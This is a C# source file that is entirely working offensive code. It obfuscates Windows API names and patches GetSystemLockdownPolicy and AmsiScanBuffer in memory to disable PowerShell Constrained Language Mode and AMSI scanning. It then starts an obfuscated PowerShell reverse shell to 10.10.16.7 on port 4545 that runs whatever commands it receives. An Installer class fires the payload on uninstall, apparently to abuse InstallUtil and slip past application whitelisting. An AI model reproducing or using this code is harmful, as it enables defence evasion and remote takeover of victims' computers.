using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;
using System.Management.Automation.Runspaces;
using Microsoft.PowerShell;
using System.Management.Automation;
using System.Configuration.Install;


namespace Myohmy
{
    public class Program
    {
        [DllImport("ke" + "r" + "ne" + "l32" + ".dl" + "l", SetLastError = true,EntryPoint = "Virt" + "ual" + "Pr" + "ot" + "ect")]
        public static extern bool e(IntPtr a, UIntPtr b, uint c, out uint d);
        [DllImport("ker" + "nel" + "32" + "." + "dl" + "l", SetLastError = true,EntryPoint = "Ge" + "tPro" + "cAd" + "dr" + "ess")]
        public static extern IntPtr f(IntPtr a, string b);
        [DllImport("ker" + "nel" + "32" + ".d" + "ll", SetLastError = true,EntryPoint = "LoadL" + "ibra" + "ry")]
        public static extern IntPtr g(string a);
        public static void PrintLastError(String message)
        {
            int lastError = Marshal.GetLastWin32Error();
            Console.Error.WriteLine("[!] Error {0}: 0x{1:X08} - {2}", message,lastError, new Win32Exception(Marshal.GetLastWin32Error()).Message);
        }
        public static void Main(string[] args)
        {
            gogo();
        }
        public static void gogo()
        {
            uint p;
            var Autom = typeof(System.Management.Automation.ApplicationInfo).Assembly;
            var gtldi = Autom.GetType("System.Management.Automation.Security.SystemPolicy").GetMethod("GetSystemLockdownPolicy", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
            var gtldh = gtldi.MethodHandle;
            RuntimeHelpers.PrepareMethod(gtldh);
            var get_lockdown_ptr = gtldh.GetFunctionPointer();
            e(get_lockdown_ptr, new UIntPtr(4), 0x40, out p);
            Marshal.Copy(new byte[] { 0x48, 0x31, 0xc0, 0xc3 }, 0, get_lockdown_ptr, 4);
            var x = g("am" + "si.d" + "l" + "l");
            var y = f(x, "Am" + "si" + "S" + "can" + "B" + "uf" + "fer");
            if (!e(y, new UIntPtr(8), 0x04, out p))
            {
                PrintLastError("Protect read/write");
                return;
            }
            Marshal.Copy(new byte[] { 0xB8 }, 0, IntPtr.Add(y, 0), 1);
            Marshal.Copy(new byte[] { 0x57 }, 0, IntPtr.Add(y, 1), 1);
            Marshal.Copy(new byte[] { 0x00 }, 0, IntPtr.Add(y, 2), 1);
            Marshal.Copy(new byte[] { 0x07 }, 0, IntPtr.Add(y, 3), 1);
            Marshal.Copy(new byte[] { 0x80 }, 0, IntPtr.Add(y, 4), 1);
            if (System.IntPtr.Size == 8)
            {
                Marshal.Copy(new byte[] { 0xC3 }, 0, IntPtr.Add(y, 5), 1);
            }
            else
            {
                Marshal.Copy(new byte[] { 0xC2 }, 0, IntPtr.Add(y, 5), 1);
                Marshal.Copy(new byte[] { 0x18 }, 0, IntPtr.Add(y, 6), 1);
                Marshal.Copy(new byte[] { 0x00 }, 0, IntPtr.Add(y, 7), 1);
            }
            if (!e(y, new UIntPtr(8), 0x20, out p))
            {
                PrintLastError("Protect exec/read");
                return;
            }
            ConsoleShell.Start(RunspaceConfiguration.Create(), "Meh", "Help", new string[] {"-exec", "bypass", "-noprofile","$tmp = @('sYSteM.nEt.sOc','KEts.tCPClIent');$tmp2 = [String]::Join('',$tmp);$client = New-Object $tmp2('10.10.16.7',4545);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ($env:UserName) + '@' + ($env:UserDomain) + ([System.Environment]::NewLine) + (get-location)+'>';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" });
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class Loader : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            base.Uninstall(savedState);
            Program.gogo();    
        }
    }
}
